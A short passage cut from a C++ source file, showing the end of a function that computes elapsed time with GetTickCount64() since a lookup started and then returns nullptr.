            static_cast<unsigned long long>(GetTickCount64() - lookupStartTick));
        return nullptr;
    }

}
